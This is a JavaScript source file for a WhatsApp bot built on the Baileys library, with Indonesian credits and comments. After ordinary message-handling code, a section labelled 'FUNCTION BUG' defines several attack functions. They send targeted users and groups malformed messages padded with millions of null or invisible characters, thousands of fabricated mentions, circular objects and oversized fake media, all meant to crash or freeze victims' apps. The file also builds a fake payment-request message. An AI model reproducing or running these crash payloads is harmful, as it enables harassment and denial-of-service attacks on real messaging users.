//NO HAPUS CREDIT YA4TIM
//CREDITS : JUSTIN
//CREDIT2 : KYUURZY
//TIKTOK : @justinandiar
//RENAME SEPERLU & SEPENTING NYA AJA BIAR GA ERORR, ERORR TANGGUNG SENDIRI!


const config = require('./settings/config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const FormData = require("form-data");
const fetch = require("node-fetch")
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');
const crypto = require("crypto");
const speed = require('performance-now')
const { spawn, exec, execSync } = require('child_process');
const { default: baileys, getContentType, generateWAMessageFromContent, downloadContentFromMessage, proto } = require("@whiskeysockets/baileys");
module.exports = async function justinoffc(client, m, chatUpdate, store) {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );
        
        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" ||
              client.user.id : m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const botNumber = await client.decodeJid(client.user.id);
        const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, './Lunox-Prime/lib/database/owner.json'), 'utf8'))
        const isOwner = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
        const isBot = botNumber.includes(senderNumber)
        
        const isCmd = body && prefix ? body.startsWith(prefix) : false
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = (body || '').replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
		const fakeMenu = ('./Lunox-Prime/ngentod.jpg');
        
        const { smsg, fetchJson, sleep, formatSize, runtime } = require('./Lunox-Prime/lib/myfunction');     
        const cihuy = fs.readFileSync('./Lunox-Prime/lib/media/w-shennmine.jpg')
        const { fquoted } = require('./Lunox-Prime/lib/fquoted')

        // group
        const groupMetadata = m?.isGroup ? await client.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        async function getLid(jid) {
            return client.getLidUser(jid)
        }
        
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ▢ Pesan: ${m.body || m.mtype} \n` +
                    `   ▢ Pengirim: ${pushname} \n` +
                    `   ▢ JID: ${senderNumber} \n`
                )
            );
            console.log();
        }
        
       
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: "arraybuffer" })
    return Buffer.from(res.data, "binary")
}

        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        async function reply(text) {
            client.sendMessage(m.chat, {
                text: "\n" + text + "\n",
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: config.settings.title,
                        body: config.settings.description,
                        thumbnailUrl: config.thumbUrl,
                        sourceUrl: config.socialMedia.Telegram,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: fquoted.channel })
        }
     
// Fungsi tambahan untuk stream to buffer
async function streamToBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) {
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

async function uploadImage(buffer) {
    try {
        const form = new FormData()

        form.append("files[]", buffer, {
            filename: "image.jpg",
            contentType: "image/jpeg"
        })

        const res = await fetch("https://uguu.se/upload.php", {
            method: "POST",
            body: form,
            headers: form.getHeaders()
        })

        const data = await res.json()

        if (!data || !data.files || !data.files[0]) {
            throw new Error("Upload gagal dari uguu")
        }

        return data.files[0].url

    } catch (err) {
        console.log("Upload error:", err)
        throw err
    }
}
        
const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: 'ownername',
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: 'TikTok PinzyOfficial'
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363424874566521@newsletter',
newsletterName: 'YT LunoxOfficial-ID',
jpegThumbnail: "",
caption: 'YouTube LunoxOfficial-ID',
inviteExpiration: Date.now() + 1814400000
}
}}   
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Pinzy - Lunox`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285183387097:+62 851-8338-7097\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.owneroff && !isCmd) {
  if (!isGroup && !isOwner) {
    const teks = `*Hai Kak* @${m.sender.split('@')[0]} Maaf *Tuanku Pinzy Sedang Offline*, Silahkan Tunggu Tuanku Kembali Online & Jangan Spam Chat`;
    return client.sendMessage(m.chat, {
      text: teks,
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          showAdAttribution: true,
          thumbnail: fs.readFileSync("./Lunox-Prime/pinzycrot.jpg"),
          renderLargerThumbnail: false,
          title: "｢ OWNER OFFLINE MODE ｣",
          mediaUrl: "https://wa.me/6285183387097",
          sourceUrl: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U",
          previewType: "PHOTO"
        }
      }
    }, { quoted: m });
  }
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

//FUNCTION BUG
async function ForceInvisions(target) {
  const stikerMessage = {
   groupStatusMessageV2: {
     message: {
       stickerMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091"
         }
       }
     }
  }
  
  const msg = generateWAMessageFromContent(target, stikerMessage, {});

  await client.relayMessage(target, {
    groupStatusMessageV2: {
    message: msg.message
  }},
  {
   messageId: msg.key.id,
   participant: { jid: target }
  });
  await new Promise((r) => setTimeout(r, 400));
}

async function DileyHarddd(target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
                fileLength: "999999999999999",
                height: 99999,
                width: 99999,
                mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
                fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
                directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1755695348",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJortulu2AgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
                mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
                contactVcard: true,
                thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}_${Math.floor(Math.random() * 1e18)}_n.enc?ccb=11-4&oh=${Math.random().toString(36).substring(2, 15)}&oe=${Math.random().toString(36).substring(2, 10)}&_nc_sid=${Math.random().toString(36).substring(2, 6)}`,
                thumbnailSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
                thumbnailEncSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              },
              hasMediaAttachment: true
            },
            body: {
              text: " Lunox - Execute "
            },
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/Pinnxyx",
                  unconsentedUsersUrl: "https://t.me/Pinnxyz",
                  consentedUsersUrl: "https://t.me/Pinnxyz",
                  cardIndex: 1
                },
                {
                  originalUrl: "https://t.me/Pinnxyz",
                  unconsentedUsersUrl: "https://t.me/Pinnxyz",
                  consentedUsersUrl: "https://t.me/Pinnxyz",
                  cardIndex: 2
                }
              ]
            },
            nativeFlowMessage: {
              buttons: [
                { 
                  name: "single_select", 
                  buttonParamsJson: "X" 
                },
                { 
                  name: "galaxy_message", 
                  buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                },
                { 
                  name: "call_permission_message", 
                  buttonParamsJson: "\x10".repeat(10000)
                }
              ],
              messageParamsJson:
                " kelra - execute " +
                "\u0000".repeat(900000)
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: { 
                conversation: " X " 
              }
            }
          }
        }
      }
    },
    {}
  )

  await client.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  })

  if (msg) {
    await client.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {})
  }
}

async function StellarBriliance(client, target, type = 'RAM') {
    const id = "🍟LUNOX VIP BY PinzyOfficial" + crypto.randomBytes(8).toString('hex').toUpperCase();
    
    const beatrixytzyy = crypto.randomBytes(1024 * 1024 * 60);
    const invis = "\u200B".repeat(5000000); 
    const gtw = " ॣ ॣ ॣ ".repeat(10000);
    const bismillah = " ﷽ ".repeat(5000);
    let briliance = invis + gtw + bismillah;

    console.log(`🤓 ampas deck by @Pinnxyz : ${target}`);

    try {
        await client.sendMessage(target, {
            document: beatrixytzyy,
            mimetype: 'application/pdf',
            fileName: `${id}.pdf`,
            caption: `*PinzyYtzz — KynaX*${id}\n` + brilliance,

            contextInfo: {
                externalAdReply: {
                    title: "nibiru, renner, wesker, bennett || Beatrix Function By Pinzy|Lunox",
                    body: "StellarBriliance",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: crypto.randomBytes(1024 * 200),
                    sourceUrl: "https://wa.me/call/13135550002" // call meta a i
                },
                
                forwardingScore: 1000,
                isForwarded: true,
                remoteJid: "120363424874566521@newsletter",
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363424874566521@newsletter",
                    serverMessageId: 1337,
                    newsletterName: "Renner¿? By Pinzy"
                },
                
                quotedMessage: {
                    conversation: invisibleGhost.slice(0, 500000)
                }
            }
        }, { 
            messageId: id,
            ephemeralExpiration: 604800 
        });

        console.log(`#— 🍔 Succes Send Bug to ${target}`);

    } catch (err) {
        console.error(`#— 🛠️ Fixed sendiri, kan LU DEV!: ${err}`);
        setTimeout(() => StellarBriliance(client, target, 'RAM'), 500);
    }
}

async function DelayCrashJembut(target) {
 try {

  const Xylent = {
   requestPhoneNumberMessage: {
    body: {
      text: "\u0000".repeat(2000000),
      format: "DEFAULT"
    },

    nativeFlowResponseMessage: {
      name: "request_phone_number",
      paramsJson: `{"phone_number":"${"\u0000".repeat(3000000)}","country_code":"${"\u0000".repeat(500000)}","otp":"${"\u0000".repeat(1000000)}","validation":"${"\u0000".repeat(800000)}"}`,
      version: 3
    },

    contextInfo: {
      ephemeralExpiration: 0,
      forwardingScore: 999999999,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
      mentionedJid: Array.from({ length: 8000 }, () => 
        Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
      ),
      statusAttributionType: 2,
      statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
        type: 1
      }))
    }

   }
  };

  await client.relayMessage(target, Xylent, {
    participant: { jid: target }
  });

  console.log(`✅ Xylent Sukses Attack To: ${target}`);

 } catch (err) {

  console.error(`❌ Error: ${err.message}`);

 }
}

async function Killers(target) {
  let str = '';
  for (let i = 0; i < 500000; i++) str += 'X';
  let Maklu = '';
  for (let i = 0; i < 50000; i++) Maklu += 'ꦾ';
  for (let i = 0; i < 50000; i++) Maklu += '𑜦𑜠';
  for (let i = 0; i < 50000; i++) Maklu += 'ោ៝';
  let Yatem = '';
  for (let i = 0; i < 100000; i++) Yatem += '{';
  let ejs = '';
  for (let i = 0; i < 500000; i++) ejs += '\u0000';
  let mention = [];
  for (let i = 0; i < 30000; i++) {
    mention.push('1' + Math.floor(Math.random() * 9999999) + '@s.whatsapp.net');
  }
  
  let nxob = {};
  nxob.self = nxob;
  
  let mixu = {};
  for (let i = 0; i < 10; i++) {
    mixu = { a: mixu, b: nxob };
  }
  
  let Bugs1 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: Maklu,
            hasMediaAttachment: true,
            imageMessage: {
              caption: str,
              width: 999999999,
              height: 999999999,
              jpegThumbnail: Buffer.alloc(50000000)
            }
          },
          body: { text: str + Maklu + ejs },
          footer: { text: str },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: Yatem,
            version: 9999
          },
          mentionedJid: mention,
          contextInfo: {
            participant: target,
            mentionedJid: mention,
            quotedMessage: mixu,
            forwardingScore: 999999999
          }
        }
      }
    }
  };
  
  let Bugs2 = {
    listMessage: {
      title: str,
      description: Maklu,
      buttonText: "?¿ LunoX | Attack ?¿",
      sections: []
    }
  };
  
  for (let s = 0; s < 100; s++) {
    let rows = [];
    for (let r = 0; r < 500; r++) {
      rows.push({
        title: 'F'.repeat(50000),
        description: 'A'.repeat(50000),
        rowId: 'P'.repeat(50000)
      });
    }
    Bugs2.listMessage.sections.push({
      title: 'X' + s + ' ' + 'X'.repeat(50000),
      rows: rows
    });
  }
  
  let Bugs3 = {
    pollCreationMessage: {
      name: Maklu,
      options: []
    }
  };
  
  for (let i = 0; i < 500; i++) {
    Bugs3.pollCreationMessage.options.push({
      optionName: 'O'.repeat(50000)
    });
  }
  
  let ortulu = await generateWAMessageFromContent(target, Bugs1, {});
  let ortulu2 = await generateWAMessageFromContent(target, Bugs2, {});
  let ortulu3 = await generateWAMessageFromContent(target, Bugs3, {});
  
  await client.relayMessage(target, ortulu.message, {
    participant: { jid: target },
    messageId: ortulu.key.id
  });
  
  await client.relayMessage(target, ortulu2.message, {
    participant: { jid: target },
    messageId: ortulu2.key.id
  });
  
  await client.relayMessage(target, ortulu3.message, {
    participant: { jid: target },
    messageId: ortulu2.key.id
  });
  
  for (let i = 0; i < 5; i++) {
    await client.relayMessage(target, { conversation: str + Maklu }, {});
    await client.relayMessage(target, {
      extendedTextMessage: {
        text: str,
        contextInfo: { mentionedJid: mention, quotedMessage: nxob }
      }
    }, {});
  }
  
  console.log(`succes Send to ${target}`);
}

async function docthumb(client, target) {
  await client.relayMessage(target,
    generateWAMessageFromContent(target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "vsp/vaultsuperior",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "1073741824000000",
                  pageCount: 9007199254740991 * 9999,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⤻꙳‌‌༑ᐧ‌⌁⃰𝐃‌𝐑‌᪳𝐎‌‌᪳𝐈𝐃`𝐔𝐈 🍷 𝐊‌𝐈‌᪳𝐋𝐋⃪ ▾ ༑‌⟆" + "ꦽ".repeat(60000),
              },
              contextInfo: {
                remoteJid: "X",
                participant: target,
                mentionedJid: [target, "13135550002@s.whatsapp.net"],
                quotedMessage: {},
                isForwarded: true,
                forwardingScore: 9999,
                externalAdReply: {
                  title: "🦋 .LunoxKing¡!",
                  body: "t.me/Pinnxyx $$$ t.me/Xyzeen",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: false,
                  containsAutoReply: true,
                  showAdAttribution: true,
                  thumbnail: { url: "https://files.catbox.moe/lck4pw.jpg" },
                },
              },
              nativeFlowMessage: {
                messageParamsJson: "{",
                buttons: [
                  {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                      icon: "REVIEW",
                      flow_cta: "\0" + "💣⃟༑𝕷𝖔𝖓𝖔𝖝⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰‌ཀ‌‌🪅-‣" + "\u0000".repeat(60000),
                      flow_message_version: "3"
                    })
                  },
                ]
              }
            }
          }
        }
      }),
      { userJid: target }
    ).message,
    {
      messageId: generateWAMessageFromContent(
        target,
        proto.Message.fromObject({}),
        { userJid: target }
      ).key.id,
      participant: { jid: target }
    }
  );
}
//FUNCTION BUG GROUP
async function crashgrouplunox(target) {
  try {
    let msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            extendedTextMessage: {
              text: "𝙇𝙪𝙣𝙤𝙭 𝘼𝙩𝙩𝙖𝙘𝙠 𝙔𝙤𝙪 ☠️" + "ꦽ".repeat(50000),
              contextInfo: {
                quotedMessage: {
                  groupInviteMessage: {
                    groupJid: "77732037327362@g.us",
                    inviteCode: "ꦽ".repeat(10000),
                    inviteExpiration: 999e+999 * Date.now(),
                    groupName: "#YT : 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥" + "ꦽ".repeat(50000),
                    caption: "#𝑳𝒖𝒏𝒐𝒙 𝑩𝒖𝒈𝒔" + "ꦽ".repeat(50000),
                    jpegThumbnail: "https://files.catbox.moe/lck4pw.jpg"
                  }
                }
              }
            }
          }
        }
      },
      {}
    );
    
    await client.sendMessage(
      target,
      {
        text: "need ff opm dana 500k tawarin ke pm"
      }
    );
    await client.groupLeave(target);
    
    await client.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });
  } catch (err) {
    console.error(err);
  }
}

async function gsIntjavgb(target, otaxkiw = true) {
  for (let i = 0; i < 20; i++) {

    let otaxi = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
          isForwarded: true,
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363424874566521@newsletter",
            newsletterName: "do u know me? | Information",
            serverMessageId: 1000,
            accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
          },
          statusAttributionType: "RESHARED_FROM_MENTION",
          contactVcard: true,
          isSampled: true,
          dissapearingMode: {
            initiator: target,
            initiatedByMe: true
          },
          expiration: Date.now()
        },
        body: {
          text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝗟𝗨𝗡𝗢𝗫",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\x10".repeat(1000000),
          version: 3
        }
      }
    }

    let msg = generateWAMessageFromContent(
      target,
      { groupStatusMessageV2: { message: otaxi } },
      {}
    )

    await client.relayMessage(
      target,
      msg.message,
      otaxkiw
        ? { messageId: msg.key.id, userJid: target }
        : { messageId: msg.key.id }
    )

    await sleep(1000)

    await client.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
      }
    })
  }
}

async function fuckgroupXnxx(target) {
    const messageContent = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "¿? 𝙄𝙢 𝙃𝙚𝙧𝙚 𝗟𝗨𝗡𝗢𝗫 🗡️🩸",
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000),
              text: "ꦽ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣",
              buttons: [
                { name: "single_select", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_method", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "call_permission_request", buttonParamsJson:"\u0003".repeat(5000), voice_call: "call_galaxy" },
                { name: "form_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_learn_more", buttonParamsJson:"\u0003".repeat(5000)},
